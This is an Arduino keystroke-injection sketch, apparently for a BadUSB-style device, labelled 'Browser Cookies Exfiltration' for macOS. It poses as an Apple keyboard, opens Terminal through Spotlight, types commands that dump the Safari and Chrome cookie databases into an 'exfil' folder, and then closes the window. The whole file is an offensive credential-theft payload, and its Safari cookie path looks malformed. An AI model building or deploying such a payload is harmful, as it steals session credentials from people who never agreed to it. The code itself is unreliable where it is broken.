#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Export browser cookies from Safari and Chrome
  // Saves to ~/Documents/exfil/cookies.txt
  // Author: Generated
  // Title: Browser Cookies Exfiltration
  // Target: macOS
  // Version: 1.0
  // Category: Credentials
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("mkdir -p ~/Documents/exfil");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("sqlite3 ~/Library/Cookies/com.apple.Safari cookies.db \"SELECT * FROM cookies;\" > ~/Documents/exfil/safari_cookies.txt 2>/dev/null || echo 'Safari cookies unavailable' > ~/Documents/exfil/safari_cookies.txt");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("sqlite3 ~/Library/Application\\ Support/Google/Chrome/Default/Cookies \"SELECT * FROM cookies;\" > ~/Documents/exfil/chrome_cookies.txt 2>/dev/null || echo 'Chrome cookies unavailable' > ~/Documents/exfil/chrome_cookies.txt");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("echo 'Cookies exported' && ls -la ~/Documents/exfil/");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}